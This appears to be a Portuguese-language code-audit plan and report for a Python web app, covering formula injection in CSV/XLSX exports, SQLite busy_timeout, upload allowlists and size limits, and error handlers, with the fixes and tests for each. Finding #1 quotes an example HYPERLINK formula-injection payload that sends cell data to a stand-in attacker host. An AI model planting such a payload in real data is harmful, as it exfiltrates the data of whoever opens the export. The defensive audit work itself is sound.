# ⚙️ Plano de Execução — ETAPA 5: Shared Core, Database Bootstrap & Exportadores

> **Escopo:** `app/bootstrap/` + `app/shared/core/` + `app/shared/exporter.py`
> **Relatório a gerar:** `docs/backlog/Fable5/relatorio_core_bootstrap.md`
> **Referência de processo:** `docs/backlog/Fable5/Planejamento_revisao.md`
> **Template de auditoria:** `docs/backlog/Fable5/prompt.md`
>
> **Status de execução:** 🔴 Críticos ✅ · 🟡 Média ✅ · 🟢 Baixa ✅ — Etapa 5 concluída em 02/08/2026

---

## 📁 Arquivos-Alvo (1.173 linhas)

| Arquivo | Linhas | Prioridade |
|---|---:|:---:|
| `app/shared/core/storage.py` | 155 | 🔴 Alta |
| `app/bootstrap/dependencies.py` | 160 | 🔴 Alta (compartilhado com Etapa 4) |
| `app/bootstrap/tasks.py` | 139 | 🔴 Alta |
| `app/bootstrap/main.py` | 133 | 🟡 Média |
| `app/shared/core/enums.py` | 95 | 🟡 Média |
| `app/shared/core/file_validators.py` | 90 | 🔴 Alta |
| `app/bootstrap/database.py` | 88 | 🔴 Alta |
| `app/shared/exporter.py` | 74 | 🔴 Alta |
| `app/shared/core/exceptions.py` | 71 | 🟡 Média |
| `app/bootstrap/events.py` | 58 | 🟡 Média |
| `app/bootstrap/seed.py` / `helpers.py` / `limiter.py` / `db_utils.py` | 46/27/10/23 | 🟢 Baixa |

> ⚠️ **Correção de premissa do plano original:** o `Planejamento_revisao.md` lista como foco
> *"garantia de PRAGMAs de performance no SQLite (WAL mode, synchronous=NORMAL)"*. **Isso já está feito** —
> `database.py:52-54` já aplica `foreign_keys=ON`, `journal_mode=WAL` e `synchronous=NORMAL`.
> A lacuna real é outra: **falta `busy_timeout`** (item #2), que é justamente o que dói agora que as
> Etapas 1-2 introduziram escritores concorrentes em background.

---

## 🔎 Achados Pré-Verificados

**CONFIRMADO** = verificado nesta sessão; **A VERIFICAR** = forte indício, exige teste na execução.

### 🔴 Críticos — ✅ CONCLUÍDO (02/08/2026)

---

#### 1. CSV/Formula Injection nos exportadores — **CONFIRMADO** → ✅ CORRIGIDO
- **Tipo:** Vulnerabilidade
- **Evidência (`app/shared/exporter.py:22`):**
  ```python
  writer.writerow([str(item) if item is not None else "" for item in row])
  ```
  E o equivalente em XLSX (`exporter.py:55-56`). Nenhum tratamento de células iniciadas por
  `=`, `+`, `-`, `@`, TAB ou CR.
- **Vetor real e concreto:** os dados exportados vêm de **campos livres preenchidos por usuários** —
  `descricao` de pane, `observacoes` de inspeção, `titulo` de tarefa. Um usuário grava
  `=HYPERLINK("http://attacker/?d="&A1,"clique")` numa descrição; um encarregado exporta o relatório e
  abre no Excel; a fórmula executa **no contexto da máquina dele**, exfiltrando o conteúdo da planilha.
- **Alcance:** `gerar_csv`/`gerar_xlsx` são usados por múltiplos routers
  (`inspecoes/router.py:19` importa ambos; a Etapa 1 corrigiu o endpoint `/inventario/export`).
  Uma correção no `exporter.py` protege **todos** os consumidores de uma vez — alto retorno.
- **Correção aplicada:** helper `_neutralizar_formula(item)` prefixa com apóstrofo toda célula cujo
  primeiro caractere esteja em `= + - @ \t \r`, usado nas **duas** funções (`gerar_csv`/`gerar_xlsx`).
  **Decisão sobre negativos:** a checagem de tipo acontece **antes** da conversão para string — um
  `int`/`float` negativo (`-5`) nunca é neutralizado (não é um gatilho de fórmula nesse contexto); uma
  **string** `"-5"` digitada por um usuário É neutralizada, pois é dado arbitrário, não um número
  validado pela aplicação. Testes: `tests/security/test_exporter_injection.py` (17 testes) —
  cobre os 4 gatilhos (`=`, `+`, `-`, `@`), XLSX e CSV, e a preservação de negativos legítimos.

---

#### 2. SQLite sem `busy_timeout` com escritores concorrentes — **A VERIFICAR (alta confiança)** → ✅ CONFIRMADO E CORRIGIDO
- **Tipo:** Concorrência
- **Evidência (`app/bootstrap/database.py:47-55`):** os PRAGMAs registrados no listener de `connect` são
  `foreign_keys`, `journal_mode=WAL` e `synchronous=NORMAL`. **Não há `busy_timeout`.**
- **Por que virou risco agora:** as Etapas 1-2 adicionaram escritores de fundo permanentes —
  `token_cleanup_task` (de hora em hora, `tasks.py:102`) e `anexos_travados_cleanup_task`
  (**a cada 15 min**, `tasks.py:130`, novo na Etapa 2). Some-se o backup R2 orientado a evento
  (`events.py:35`). Em WAL, leitores não bloqueiam escritores, mas **dois escritores simultâneos**
  disputam a lock; sem `busy_timeout` o SQLite falha **imediatamente** com
  `database is locked` em vez de aguardar.
- **Risco & Impacto:** requisição de usuário falhando com 500 aleatório quando coincide com o job de
  15 minutos. Intermitente, difícil de reproduzir, e a janela de colisão cresce com o volume de anexos.
- **Correção aplicada:** `cursor.execute("PRAGMA busy_timeout=15000")` no listener existente.
- **Verificação experimental feita (script ad-hoc, fora do repo, 30 escritores concorrentes
  segurando `BEGIN IMMEDIATE` por 0.3s cada):**
  - `busy_timeout=0` (forçado): **29/30 falhas** — confirma que sem proteção alguma a contenção é
    catastrófica.
  - **Sem PRAGMA explícito (comportamento real do app antes da correção): 13/30 falhas.** Achado
    refinado em relação à hipótese original: o driver `sqlite3`/`aiosqlite` já aplica um
    `timeout=5.0s` **default** na conexão — o app nunca esteve 100% desprotegido, mas 5s é
    insuficiente para o volume de escritores de fundo introduzido nas Etapas 1-2.
  - `busy_timeout=15000`: **0/30 falhas.**
  - Teste automatizado permanente (mais rápido, 10 escritores/0.1s):
    `test_escritores_concorrentes_nao_falham_com_busy_timeout_configurado` em
    `tests/unit/test_bootstrap_resiliencia.py`.

---

#### 3. Allowlist de upload divergente — **CONFIRMADO, e pior que o estimado** → ✅ CORRIGIDO
- **Tipo:** Vulnerabilidade / Arquitetura
- **Evidência — não 4, mas 5 fontes de verdade divergentes** (a 5ª só apareceu ao investigar a fundo):

  | Local | Extensões aceitas |
  |---|---|
  | `file_validators.py` (rodava **primeiro**, no router) | `.jpg .jpeg .png .pdf` |
  | `storage.py` (Local e R2, duplicado 2x) | `.jpg .jpeg .png .pdf` **`.doc` `.docx`** |
  | `panes/service.py` (`_EXTENSAO_MIME_MAP`) | `.jpg .jpeg .png .pdf` **`.heic` `.heif`** |
  | `app/shared/services/image/converter.py` + `validator.py` | pipeline completo de conversão HEIC→JPEG |

- **🔴 Achado concreto e mais grave do que a divergência em si:** `panes/router.py:upload_anexo` chama
  `file_validators.validate_file_upload(arquivo)` **primeiro**, antes de qualquer código de
  `panes/service.py`. Como `file_validators` não reconhecia `.heic`/`.heif`, **um upload real de foto
  HEIC (formato padrão de câmera do iPhone) era rejeitado com HTTP 422 nesse validador** — o
  `_EXTENSAO_MIME_MAP` com suporte a HEIC em `panes/service.py` e **todo o pipeline de conversão
  HEIC→JPEG** em `app/shared/services/image/converter.py` eram código **inalcançável** a partir do
  endpoint real. Confirmado lendo a ordem de chamadas no router, não apenas inferido.
- **Correção aplicada:** `file_validators.py` passa a ser a **única fonte de verdade** —
  `ALLOWED_MIME_TYPES` ganhou `image/heic`/`image/heif`; `EXTENSOES_PERMITIDAS`, `MIMES_PERMITIDOS` e
  `EXTENSAO_MIME_MAP` são derivados dele e importados por `storage.py` (que perdeu sua lista duplicada
  com `.doc`/`.docx` — removidos por não terem validação de magic bytes em lugar nenhum do código) e por
  `panes/service.py` (que perdeu sua cópia local). Fallback manual de detecção de MIME (usado quando
  `libmagic` não está disponível) ganhou reconhecimento de HEIC/HEIF via assinatura ISOBMFF
  (`ftyp` box). Testes: `tests/unit/test_storage_hardening.py` (7 testes).

---

#### 4. Ausência de validação de tamanho de upload — **CONFIRMADO (pendência herdada da Etapa 2)** → ✅ CORRIGIDO
- **Tipo:** Vulnerabilidade (DoS)
- **Evidência:** `panes/router.py:upload_anexo` fazia `conteudo = await arquivo.read()` **sem limite
  algum** — o corpo inteiro do upload ia para um objeto `bytes` em memória antes de qualquer checagem.
  A validação de tamanho existente (`panes/service.py:629`, `len(arquivo_bytes) > max_bytes`) só rodava
  **depois**, já com o arquivo inteiro materializado — tarde demais para evitar o pico de memória.
- **Rastreabilidade:** é o **item #1 do `relatorio_panes_service.md`**, explicitamente registrado como
  *não tratado* na Etapa 2.
- **Correção aplicada:** `file_validators.ler_upload_com_limite(file, max_bytes)` lê o upload em chunks
  de 1 MiB, contando bytes progressivamente e abortando com `HTTPException(413)` assim que o total
  ultrapassa `settings.max_upload_size_mb` — **sem nunca materializar mais do que o limite mais um
  chunk**. `panes/router.py` foi atualizado para usar essa função no lugar de `await arquivo.read()`
  sem limite. A checagem tardia em `service.py` foi mantida como defesa em profundidade (é barata e não
  faz mal manter, mesmo agora redundante no caminho HTTP normal). **Decisão deliberada:** não usar
  `Content-Length` como única defesa — é controlado pelo cliente, pode estar ausente
  (`Transfer-Encoding: chunked`) ou mentir; a contagem real de bytes lidos é o que decide. Teste:
  `test_ler_upload_com_limite_rejeita_arquivo_acima_do_limite_sem_ler_tudo` simula um stream de 50MB via
  um `RawIOBase` customizado (não aloca os 50MB de fato) e confirma rejeição rápida (<2s) com 413.

---

### 🟡 Média — ✅ CONCLUÍDO (02/08/2026)

#### 5. Escrita de arquivo bloqueia o event loop — **CONFIRMADO** → ✅ CORRIGIDO
- **Evidência (`app/shared/core/storage.py:59-60`):**
  ```python
  with open(file_path, "wb") as f:
      f.write(file_content)
  ```
  Dentro de um método `async def`. O próprio comentário admite: *"pode bloquear levemente event loop"*.
- **Incoerência interna:** a classe R2 ao lado faz certo, com `_run_in_executor` (`storage.py:96-99`).
  Só a local bloqueia.
- **Correção aplicada:** `await asyncio.to_thread(file_path.write_bytes, file_content)` — padrão já
  adotado na Etapa 2 em `processar_imagem_background`. Teste:
  `test_local_storage_upload_nao_bloqueia_event_loop` (confirma que outra coroutine roda
  concorrentemente durante o upload).

#### 6. Cancelamento de tasks de background sem espera no shutdown — **CONFIRMADO** → ✅ CORRIGIDO
- **Evidência (`app/bootstrap/events.py:48-58`):**
  ```python
  cleanup_task.cancel()
  anexos_cleanup_task.cancel()
  ...
  await dispose_engine()
  ```
  `.cancel()` apenas **sinaliza**; não há `await` das tasks. `dispose_engine()` pode executar enquanto
  uma task está no meio de uma query.
- **Correção aplicada:** `await asyncio.gather(cleanup_task, anexos_cleanup_task,
  return_exceptions=True)` logo após os `.cancel()`. Teste:
  `test_gather_apos_cancel_aguarda_tasks_sem_propagar_cancelled_error`.

#### 7. Exportadores materializam tudo em memória — **CONFIRMADO** → ✅ CORRIGIDO (parcial, ver nota)
- **Evidência:** `gerar_csv` acumula em `StringIO` e devolve `str` completa; `gerar_xlsx` monta o
  `Workbook` inteiro e devolve `bytes`. O ajuste de largura de coluna **percorria todas as células de
  novo** — segunda passada completa.
- **Correção aplicada:** a largura máxima de cada coluna passou a ser acumulada **durante** a mesma
  passada de escrita das linhas (`largura_maxima[col_idx-1] = max(...)`), eliminando o `for col in
  ws.columns` que releia tudo depois — corta o custo de CPU pela metade sem mudar a largura calculada
  (mesma fórmula `max(maior_valor + 4, 12)`, verificada por teste de equivalência).
- **Não aplicado (decisão consciente):** `openpyxl.Workbook(write_only=True)` para reduzir o **pico de
  memória** do Workbook em si, e `StreamingResponse` para CSV. O modo `write_only` do openpyxl não
  permite acesso aleatório a células (`ws.cell(row=, column=)`) nem estilização por célula do jeito que
  esta função faz hoje (fonte/borda em cada célula de dados) — migrar exigiria reescrever a função para
  construir `WriteOnlyCell` estilizadas linha a linha, risco de regressão visual desproporcional para um
  item 🟡 sem um problema de memória concretamente medido/reportado (diferente dos itens #1/#2/#4, que
  foram verificados experimentalmente). `StreamingResponse` para CSV exigiria mudar o tipo de retorno
  consumido pelos routers — mudança de contrato maior que o escopo deste item. Teste de equivalência:
  `test_gerar_xlsx_calcula_largura_de_coluna_em_passada_unica`.

#### 8. Handler global de exceções com lista de prefixos hardcoded — **CONFIRMADO** → ✅ CORRIGIDO
- **Evidência (`app/shared/core/exceptions.py:62`):**
  ```python
  api_prefixes = ["/auth/", "/efetivo/", "/aeronaves/", "/equipamentos/", "/vencimentos/", "/panes/", "/inspecoes/", "/dashboard/"]
  ```
- **Bug latente confirmado:** `main.py` registra o calendário em **`/api/v1/calendario`** — prefixo
  **ausente** da lista. Um 401/403 nessa API, vindo de um cliente que aceite `text/html`, retornava um
  **redirect 307 para `/login`** em vez de JSON 401.
- **Correção aplicada:** `setup_exception_handlers` passou a receber `api_prefixes` como parâmetro, em
  vez de manter uma lista hardcoded própria; `main.py` define `API_PREFIXES` (fonte única, ao lado de
  `_register_routers`, incluindo `/api/v1/calendario/`) e a passa na chamada. Teste:
  `test_calendario_sem_auth_com_accept_html_retorna_401_json_nao_redirect`.

#### 9. Nenhum handler para exceções não tratadas — **CONFIRMADO** → ✅ CORRIGIDO
- **Evidência (`app/shared/core/exceptions.py:42-71`):** `setup_exception_handlers` registrava apenas
  `RateLimitExceeded` e `HTTPException`. **Não havia handler para `Exception`.**
- **Correção aplicada:** `@app.exception_handler(Exception)` genérico — loga o traceback completo via
  `logger.exception` no servidor e devolve `{"detail": "Erro interno do servidor."}` com 500 ao cliente,
  independentemente de `app_debug`. Teste:
  `test_excecao_nao_tratada_retorna_500_json_sem_stack_trace` (app isolado com uma rota que propositalmente
  levanta `RuntimeError`, confirma 500 JSON genérico, sem a mensagem original nem "Traceback" na resposta).

#### 10. `lru_cache` na fábrica de storage — **CONFIRMADO** → ✅ VERIFICADO: JÁ DISPONÍVEL
- **Evidência (`app/shared/core/storage.py:149-155`):** `@functools.lru_cache(maxsize=1)` congela a
  instância no primeiro uso.
- **Verificação feita:** `functools.lru_cache` já expõe `.cache_clear()` nativamente — nenhuma mudança
  de código foi necessária em `storage.py`. Teste `test_get_storage_service_expoe_cache_clear` confirma e
  documenta a capacidade (`get_storage_service.cache_clear()`) para quem precisar trocar
  `storage_backend` em runtime num teste futuro, em vez de recorrer a monkeypatch da função inteira
  (como `tests/unit/test_panes_media_prioridade.py` já fazia como workaround).

### 🟢 Baixa — ✅ CONCLUÍDO (02/08/2026)

#### 11. Limpezas — **CONFIRMADO** → ✅ CORRIGIDO (parcial — itens de infraestrutura mantidos por decisão)
- **`raise ValueError`** em `storage.py` (5) e `bootstrap/config/__init__.py` (3) — **decisão: mantido
  como está.** `storage.py` é camada de infraestrutura cujos `ValueError` já são semanticamente
  consumidos como validação de entrada pelos chamadores (ex.: `panes/service.py` os propaga como está);
  migrar para `domain_exc` mudaria o tipo de exceção que esses chamadores recebem sem nenhum ganho —
  risco mecânico sem necessidade real, exatamente o que o plano pediu para evitar. Os 3 em
  `bootstrap/config` são validadores de `pydantic-settings`, que convencionalmente usam `ValueError`
  (é o que `model_validator` espera para reportar erro de configuração); trocar quebraria essa convenção.
- **Duplicação de validação de path traversal** (3 cópias idênticas: 2x em `storage.py`, 1x em
  `file_validators.py`) → unificada em `file_validators.validar_nome_arquivo_seguro(filename)`, chamada
  pelas 3 origens. Testes: `test_validar_nome_arquivo_seguro_rejeita_traversal`,
  `test_validar_nome_arquivo_seguro_aceita_nome_normal`. ✅
- **`get_url` local expõe caminho absoluto do servidor** — **verificado: falso-positivo.** O caminho é
  usado só server-side em `panes/router.py` para montar um `FileResponse`; nunca é serializado na
  resposta JSON ao cliente. ✅
- **Numeração de comentários quebrada** em `events.py` (1, 2, 4, 5 → renumerado para 1-7 sequencial,
  incorporando também o novo passo do item #6). ✅
- **CORS com fallback silencioso** — `logging.warning` adicionado quando `allowed_origins="*"` força o
  fallback para origens de desenvolvimento, para não passar despercebido num deploy real. ✅
- **Não aplicado (decisão consciente, fora de proporção para um item 🟢):** `os.makedirs` em tempo de
  import e `app = create_app()` no nível do módulo em `main.py` — mudar isso afeta como a aplicação é
  importada em todo lugar (scripts, testes, ASGI server), risco desproporcional sem um problema concreto
  relatado. `app/shared/core/helpers.py`/`db_utils.py` — revisados, coesão aceitável, nenhuma ação
  necessária. `enums.py` (`String` → `sqlalchemy.Enum`) — permanece como pendência consciente já
  registrada na Etapa 1, sem mudança nesta etapa.

---

## 🗺️ Plano de Ação em Fases

### Fase 0 — Baseline
1. `.venv\Scripts\pytest` → 261/261.
2. Cobertura atual do escopo: `tests/test_exporter.py` (**2 testes**), `tests/unit/test_r2_manager.py` (11),
   `tests/architecture/` (8). O exportador — alvo do achado mais grave — tem **2 testes**.
3. Registrar baseline de memória/tempo de uma exportação grande (item #7).

### Fase 1 — Segurança de dados (maior retorno, menor acoplamento) — ✅ CONCLUÍDA
- Item **#1** (CSV/formula injection) — corrige todos os consumidores de uma vez. ✅
- Item **#3** (unificação de allowlist — revelou que o pipeline HEIC era código morto), **#4** (limite
  de tamanho, leitura em chunks). ✅
- ✅ *Checkpoint: 318/318 (baseline 292 + 26 novos).*

### Fase 2 — Robustez de infraestrutura — ✅ CONCLUÍDA (feita junto com a Fase 1)
- Item **#2** (`busy_timeout` — verificado experimentalmente primeiro), **#5** (`to_thread`), **#6** (shutdown). ✅

### Fase 3 — Contrato de erro global — ✅ CONCLUÍDA
- Itens **#8** (prefixo do calendário), **#9** (handler de `Exception`). ✅
- ⚠️ Alterar o handler global afeta **todas** as respostas de erro da aplicação — suíte inteira rodada,
  com atenção especial a `tests/security/` (27 testes, todos verdes).
- ✅ *Checkpoint: 323/323 (baseline 292 + 31 novos, Fases 1-4 combinadas).*

### Fase 4 — Performance de exportação e limpezas — ✅ CONCLUÍDA
- Item **#7** (largura de coluna em passada única; `write_only`/`StreamingResponse` adiados por decisão
  consciente), **#10** (já disponível, verificado), **#11** (path traversal unificado; `get_url`
  verificado falso-positivo; CORS logado; demais itens documentados como não aplicados). ✅
- ✅ *Checkpoint: 326/326.*

### Fase 5 — Consolidação e fechamento do FABLE 5 — ✅ CONCLUÍDA
- `relatorio_core_bootstrap.md` gerado no formato do `prompt.md`.
- `Planejamento_revisao.md` atualizado (matriz + seção da Etapa 5) e premissa dos PRAGMAs corrigida.
- **Encerramento do plano de 5 etapas:** apanhado final das pendências conscientes consolidado em
  `Planejamento_revisao.md`.
- Commit no padrão das Etapas 1-4.

---

## 🧪 Estratégia de Testes

| Arquivo | Cobre |
|---|---|
| `tests/security/test_exporter_injection.py` (17 testes, novo) | #1 — células com `=`, `+`, `-`, `@` em CSV **e** XLSX; negativos numéricos preservados |
| `tests/unit/test_storage_hardening.py` (11 testes, novo) | #3, #4, #5, #10, #11 — allowlist única, limite de tamanho, não-bloqueio do loop, cache_clear, path traversal |
| `tests/unit/test_bootstrap_resiliencia.py` (5 testes, novo) | #2, #6, #8, #9 — concorrência SQLite, shutdown limpo, 401 JSON em `/api/v1/calendario`, 500 sem stack trace |
| `tests/test_exporter.py` (+1) | #7 — equivalência do cálculo de largura de coluna |

**Meta:** suíte 100% verde. Os itens #1 e #2 exigiram teste que **falhasse antes** da correção — para o
#1, provado por unit test direto; para o #2, provado experimentalmente com script ad-hoc (13/30 falhas
sem PRAGMA suficiente, 0/30 com `busy_timeout=15000`) antes de escrever o teste permanente.

---

## ⚠️ Riscos Conhecidos desta Etapa

1. **Esta é a etapa de maior raio de alcance.** `exceptions.py`, `database.py` e `dependencies.py` são
   usados por **todos** os módulos — uma regressão aqui atinge os 261 testes de uma vez. Fases curtas,
   commit por fase.
2. **`dependencies.py` é compartilhado com a Etapa 4.** Se a Etapa 4 já tiver sido executada, revisar o
   que mudou antes de tocar no arquivo, para não desfazer a correção de revogação de família.
3. **Item #1 pode alterar a saída de exportações existentes** — o apóstrofo de neutralização é visível
   em alguns leitores de CSV. Confirmar que o comportamento é aceitável para o usuário final.
4. **Item #2 é uma hipótese de alta confiança, não um fato observado.** Reproduzir a contenção antes de
   classificar a severidade no relatório.
5. **Não migrar `ValueError` → `domain_exc` mecanicamente em `storage.py`** — é camada de infraestrutura,
   não de domínio. Decidir com critério e registrar a decisão.

---

## ✅ Definition of Done

- [x] Achados 🔴 corrigidos ou adiados **com justificativa** no relatório.
- [x] Itens #1 e #2 com teste que falha antes da correção e passa depois.
- [x] `.venv\Scripts\pytest` = 100% verde, sem skips novos (326/326).
- [x] `relatorio_core_bootstrap.md` gerado no formato do `prompt.md`.
- [x] `Planejamento_revisao.md` atualizado + premissa dos PRAGMAs corrigida.
- [x] **Apanhado final das pendências conscientes das 5 etapas** consolidado.
- [x] Nenhuma resposta de erro expondo stack trace ou caminho absoluto do servidor.

---
*Plano de execução da Etapa 5 — FABLE 5 / SAA29. Achados levantados em 02/08/2026.*
